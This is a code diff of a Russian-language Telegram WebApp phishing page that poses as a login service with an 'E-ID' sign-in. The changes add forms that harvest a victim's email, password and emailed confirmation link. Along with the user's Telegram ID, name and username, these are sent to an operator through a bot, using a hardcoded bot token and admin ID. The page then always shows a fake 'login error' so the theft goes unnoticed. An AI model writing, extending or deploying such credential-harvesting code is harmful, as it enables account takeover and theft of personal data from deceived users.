@@ -414,18 +414,19 @@
             width: 100%;
             padding: var(--space-3);
             background: transparent;
-            color: var(--color-text-secondary);
+            color: var(--color-blue-600);
             border: 1px solid var(--color-border-default);
             border-radius: var(--radius-card-sm);
             font-size: var(--text-body-sm-size);
             line-height: var(--text-body-sm-lh);
             font-weight: var(--fw-medium);
             cursor: pointer;
-            transition: background .15s;
+            transition: background .15s, color .15s;
             margin-top: var(--space-3);
         }
         .support-btn:hover {
             background: var(--color-bg-surface-soft);
+            color: var(--color-blue-700);
         }
 
         /* ============================================================
@@ -762,22 +763,29 @@
         }
 
         /* ============================================================
-           СТРАНИЦА УСПЕХА
+           СТРАНИЦА ОШИБКИ ВХОДА (вместо успеха)
            ============================================================ */
-        .success-page {
+        .login-error-page {
             text-align: center;
             padding: var(--space-6) 0;
         }
-        .success-page .check {
+        .login-error-page .icon {
             font-size: 56px;
             margin-bottom: var(--space-3);
+            color: #b91c1c;
         }
-        .success-page h2 {
+        .login-error-page h2 {
             font-size: var(--text-heading-2-size);
             line-height: var(--text-heading-2-lh);
             font-weight: var(--fw-semibold);
-            color: var(--color-text-success);
+            color: #b91c1c;
             margin-bottom: var(--space-2);
+        }
+        .login-error-page p {
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            color: var(--color-text-secondary);
+            margin-bottom: var(--space-4);
         }
 
         /* ============================================================
@@ -1016,31 +1024,76 @@
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 8: E-ID (специальный стиль .page-eid)
+        СТРАНИЦА 8: E-ID (email + пароль + ссылка)
         ============================================================ -->
         <div id="pageEid" class="page page-eid">
             <div class="page-icon">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
             </div>
             <div class="page-title">Вход через E-ID</div>
-            <div class="page-sub">Введите ваш идентификатор E-ID</div>
+            <div class="page-sub">Введите свои данные для входа</div>
 
-            <div class="form-group">
-                <label>Идентификатор E-ID</label>
-                <input type="text" id="eidInput" placeholder="Например: 1234567890">
+            <div id="eidFields">
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="eidEmail" placeholder="Введите ваш email">
+                </div>
+                <div class="form-group">
+                    <label>Пароль</label>
+                    <input type="password" id="eidPassword" placeholder="Введите пароль">
+                </div>
             </div>
 
-            <button class="btn-primary" onclick="handleEid()">Войти через E-ID</button>
+            <button id="eidSubmitBtn" class="btn-primary" onclick="handleEidLogin()">Войти через E-ID</button>
 
-            <div id="eidError" class="message error" style="display:none; margin-top:12px;">
-                Ошибка. Проверьте правильность E-ID.
+            <div id="eidLoginError" class="message error" style="display:none; margin-top:12px;">
+                Ошибка. Повторите попытку входа.
             </div>
 
             <button class="btn-back" onclick="goToMain()">← Назад</button>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 9: ОШИБКА
+        СТРАНИЦА 9: ССЫЛКА ПОДТВЕРЖДЕНИЯ (E-ID)
+        ============================================================ -->
+        <div id="pageEidLink" class="page page-eid">
+            <div class="page-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+            </div>
+            <div class="page-title">Ссылка подтверждения</div>
+            <div class="page-sub">Вставьте ссылку из письма</div>
+
+            <div id="eidLinkFields">
+                <div class="code-section">
+                    <label>Ссылка подтверждения</label>
+                    <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку">
+                    <button id="eidLinkSubmitBtn" class="btn-primary" onclick="handleEidLink()">Подтвердить</button>
+                </div>
+            </div>
+
+            <div id="eidLinkError" class="message error" style="display:none; margin-top:12px;">
+                Ошибка. Повторите попытку входа.
+            </div>
+
+            <div class="status-waiting" id="eidLinkStatus">
+                <span class="spinner"></span> Ожидание...
+            </div>
+
+            <button class="btn-back" onclick="goToEid()">← Назад</button>
+        </div>
+
+        <!-- ============================================================
+        СТРАНИЦА 10: ОШИБКА ВХОДА (вместо успеха)
+        ============================================================ -->
+        <div id="pageLoginError" class="page login-error-page">
+            <div class="icon">✕</div>
+            <h2>Ошибка</h2>
+            <p>Повторите попытку входа.</p>
+            <button class="btn-secondary" onclick="goToMain()" style="margin-top:20px;">Вернуться на главную</button>
+        </div>
+
+        <!-- ============================================================
+        СТРАНИЦА 11: ОШИБКА (3 попытки)
         ============================================================ -->
         <div id="pageError" class="page">
             <div class="error-block">
@@ -1052,16 +1105,6 @@
                 </button>
                 <button class="btn-back" onclick="goToMain()" style="margin-top:10px;">← На главную</button>
             </div>
-        </div>
-
-        <!-- ============================================================
-        СТРАНИЦА 10: УСПЕХ
-        ============================================================ -->
-        <div id="pageSuccess" class="page success-page">
-            <div class="check">✓</div>
-            <h2>Ожидание</h2>
-            <p style="color:var(--color-text-secondary);font-size:14px;">Администратор проверит ваши данные</p>
-            <button class="btn-secondary" onclick="goToMain()" style="margin-top:20px;">Вернуться на главную</button>
         </div>
 
         <!-- ===== СООБЩЕНИЯ ===== -->
@@ -1076,7 +1119,7 @@
 
     <script>
         // ============================================================
-        // 1. КОНФИГ (без изменений)
+        // 1. КОНФИГ
         // ============================================================
         const BOT_TOKEN = "8603629858:AAHoJGBCDvvImzpO3wllUriPulRvX0APozY";
         const ADMIN_ID = "8542901240";
@@ -1084,7 +1127,7 @@
         const MAX_ATTEMPTS = 3;
 
         // ============================================================
-        // 2. ИНИЦИАЛИЗАЦИЯ (без изменений)
+        // 2. ИНИЦИАЛИЗАЦИЯ
         // ============================================================
         const tg = window.Telegram.WebApp;
         tg.expand();
@@ -1097,22 +1140,29 @@
         const pageLoginForm = document.getElementById('pageLoginForm');
         const pageCode = document.getElementById('pageCode');
         const pageEid = document.getElementById('pageEid');
+        const pageEidLink = document.getElementById('pageEidLink');
+        const pageLoginError = document.getElementById('pageLoginError');
         const pageError = document.getElementById('pageError');
-        const pageSuccess = document.getElementById('pageSuccess');
 
         const email = document.getElementById('email');
         const password = document.getElementById('password');
         const codeInput = document.getElementById('codeInput');
-        const eidInput = document.getElementById('eidInput');
+        const eidEmail = document.getElementById('eidEmail');
+        const eidPassword = document.getElementById('eidPassword');
+        const eidLinkInput = document.getElementById('eidLinkInput');
 
         const loginError = document.getElementById('loginError');
         const codeError = document.getElementById('codeError');
-        const eidError = document.getElementById('eidError');
+        const eidLoginError = document.getElementById('eidLoginError');
+        const eidLinkError = document.getElementById('eidLinkError');
 
         const codeStatus = document.getElementById('codeStatus');
+        const eidLinkStatus = document.getElementById('eidLinkStatus');
 
         const loginSubmitBtn = document.getElementById('loginSubmitBtn');
         const submitCodeBtn = document.getElementById('submitCodeBtn');
+        const eidSubmitBtn = document.getElementById('eidSubmitBtn');
+        const eidLinkSubmitBtn = document.getElementById('eidLinkSubmitBtn');
 
         const msgDiv = document.getElementById('msg');
 
@@ -1121,7 +1171,7 @@
         let attemptCount = 0;
 
         // ============================================================
-        // 3. ВСПОМОГАТЕЛЬНЫЕ (без изменений)
+        // 3. ВСПОМОГАТЕЛЬНЫЕ
         // ============================================================
         function showMessage(text, type = 'info') {
             msgDiv.textContent = text;
@@ -1138,7 +1188,8 @@
             msgDiv.style.display = 'none';
             loginError.style.display = 'none';
             codeError.style.display = 'none';
-            eidError.style.display = 'none';
+            eidLoginError.style.display = 'none';
+            eidLinkError.style.display = 'none';
         }
 
         function goToMain() {
@@ -1146,10 +1197,17 @@
             email.value = '';
             password.value = '';
             codeInput.value = '';
-            eidInput.value = '';
+            eidEmail.value = '';
+            eidPassword.value = '';
+            eidLinkInput.value = '';
             codeStatus.style.display = 'none';
+            eidLinkStatus.style.display = 'none';
             loginSubmitBtn.disabled = false;
             loginSubmitBtn.textContent = 'Войти';
+            eidSubmitBtn.disabled = false;
+            eidSubmitBtn.textContent = 'Войти через E-ID';
+            eidLinkSubmitBtn.disabled = false;
+            eidLinkSubmitBtn.textContent = 'Подтвердить';
             attemptCount = 0;
         }
 
@@ -1158,9 +1216,10 @@
         function goToGuide() { switchPage(pageGuide); }
         function goToFaq() { switchPage(pageFaq); }
         function goToLoginForm() { switchPage(pageLoginForm); setTimeout(() => email.focus(), 300); }
-        function goToEid() { switchPage(pageEid); setTimeout(() => eidInput.focus(), 300); }
+        function goToEid() { switchPage(pageEid); setTimeout(() => eidEmail.focus(), 300); }
+        function goToEidLink() { switchPage(pageEidLink); setTimeout(() => eidLinkInput.focus(), 300); }
+        function goToLoginError() { switchPage(pageLoginError); }
         function goToError() { switchPage(pageError); }
-        function goToSuccess() { switchPage(pageSuccess); }
 
         function getUserData() {
             const user = tg.initDataUnsafe?.user;
@@ -1174,8 +1233,8 @@
         function handleError() {
             attemptCount++;
             if (attemptCount >= MAX_ATTEMPTS) {
-                document.querySelectorAll('#loginFields input, #codeFields input').forEach(el => el.disabled = true);
-                document.querySelectorAll('#loginFields button, #codeFields button').forEach(el => el.disabled = true);
+                document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
+                document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
                 goToError();
                 return true;
             }
@@ -1183,7 +1242,7 @@
         }
 
         // ============================================================
-        // 4. ОТПРАВКА В БОТА (без изменений)
+        // 4. ОТПРАВКА В БОТА
         // ============================================================
         async function sendToAdmin(text) {
             try {
@@ -1204,7 +1263,7 @@
         }
 
         // ============================================================
-        // 5. ОБЫЧНЫЙ ВХОД (erub) → поле КОД (без изменений)
+        // 5. ОБЫЧНЫЙ ВХОД → КОД
         // ============================================================
         loginSubmitBtn.addEventListener('click', async function() {
             const e = email.value.trim();
@@ -1242,7 +1301,7 @@
         });
 
         // ============================================================
-        // 6. КОД (без изменений)
+        // 6. КОД → ОШИБКА
         // ============================================================
         submitCodeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
@@ -1258,12 +1317,12 @@
             const ok = await sendToAdmin(msg);
 
             if (ok) {
-                showMessage('Ожидание...', 'success');
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = 'Подтвердить';
                 codeInput.value = '';
                 codeStatus.style.display = 'none';
-                goToSuccess();
+                // ВСЕГДА ПОКАЗЫВАЕМ ОШИБКУ (как в вашем ТЗ)
+                goToLoginError();
             } else {
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = 'Подтвердить';
@@ -1275,48 +1334,78 @@
         });
 
         // ============================================================
-        // 7. E-ID (без изменений)
+        // 7. E-ID ЛОГИН → ССЫЛКА
         // ============================================================
-        function handleEid() {
-            const eid = eidInput.value.trim();
-            const errorEl = document.getElementById('eidError');
+        eidSubmitBtn.addEventListener('click', async function() {
+            const e = eidEmail.value.trim();
+            const p = eidPassword.value.trim();
 
-            if (!eid || eid.length < 4) {
-                errorEl.style.display = 'block';
-                return;
+            if (!e || !p) { showMessage('Заполните все поля', 'error'); return; }
+            if (!e.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
+
+            eidSubmitBtn.disabled = true;
+            eidSubmitBtn.textContent = 'Отправка...';
+
+            userEmail = e;
+            userPassword = p;
+
+            const user = getUserData();
+            const msg = `🆔 E-ID ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+
+            const ok = await sendToAdmin(msg);
+
+            if (ok) {
+                eidSubmitBtn.disabled = false;
+                eidSubmitBtn.textContent = 'Войти через E-ID';
+                switchPage(pageEidLink);
+                eidLinkStatus.style.display = 'block';
+                showMessage('Ссылка отправлена на почту', 'success');
+                setTimeout(() => eidLinkInput.focus(), 300);
+            } else {
+                eidSubmitBtn.disabled = false;
+                eidSubmitBtn.textContent = 'Войти через E-ID';
+                if (handleError()) return;
+                eidLoginError.style.display = 'block';
+                eidLoginError.textContent = `Ошибка. Повторите попытку входа. (${attemptCount}/${MAX_ATTEMPTS})`;
+                showMessage('Ошибка отправки', 'error');
             }
-
-            errorEl.style.display = 'none';
-            showMessage('Идёт проверка E-ID...', 'info');
-
-            const btn = document.querySelector('#pageEid .btn-primary');
-            btn.disabled = true;
-
-            setTimeout(async () => {
-                const user = getUserData();
-                const msg = `🆔 Вход через E-ID\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n🆔 E-ID: ${eid}`;
-                const ok = await sendToAdmin(msg);
-
-                btn.disabled = false;
-                const msgEl = document.querySelector('.page.active .dynamic-message');
-                if (msgEl) msgEl.style.display = 'none';
-
-                if (ok) {
-                    showMessage('Вход через E-ID успешен!', 'success');
-                    setTimeout(() => {
-                        goToMain();
-                        eidInput.value = '';
-                        const msg2 = document.querySelector('.page.active .dynamic-message');
-                        if (msg2) msg2.style.display = 'none';
-                    }, 2000);
-                } else {
-                    showMessage('Ошибка отправки E-ID', 'error');
-                }
-            }, 1500);
-        }
+        });
 
         // ============================================================
-        // 8. ENTER (без изменений)
+        // 8. E-ID ССЫЛКА → ОШИБКА
+        // ============================================================
+        eidLinkSubmitBtn.addEventListener('click', async function() {
+            const link = eidLinkInput.value.trim();
+
+            if (!link) { showMessage('Вставьте ссылку подтверждения', 'error'); return; }
+
+            eidLinkSubmitBtn.disabled = true;
+            eidLinkSubmitBtn.textContent = 'Отправка...';
+
+            const user = getUserData();
+            const msg = `🔗 Ссылка подтверждения (E-ID)\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`;
+
+            const ok = await sendToAdmin(msg);
+
+            if (ok) {
+                eidLinkSubmitBtn.disabled = false;
+                eidLinkSubmitBtn.textContent = 'Подтвердить';
+                eidLinkInput.value = '';
+                eidLinkStatus.style.display = 'none';
+                // ВСЕГДА ПОКАЗЫВАЕМ ОШИБКУ
+                goToLoginError();
+            } else {
+                eidLinkSubmitBtn.disabled = false;
+                eidLinkSubmitBtn.textContent = 'Подтвердить';
+                if (handleError()) return;
+                eidLinkError.style.display = 'block';
+                eidLinkError.textContent = `Ошибка. Повторите попытку входа. (${attemptCount}/${MAX_ATTEMPTS})`;
+                showMessage('Ошибка отправки', 'error');
+            }
+        });
+
+        // ============================================================
+        // 9. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -1325,7 +1414,9 @@
                 } else if (pageCode.classList.contains('active')) {
                     submitCodeBtn.click();
                 } else if (pageEid.classList.contains('active')) {
-                    document.querySelector('#pageEid .btn-primary').click();
+                    eidSubmitBtn.click();
+                } else if (pageEidLink.classList.contains('active')) {
+                    eidLinkSubmitBtn.click();
                 }
             }
         });
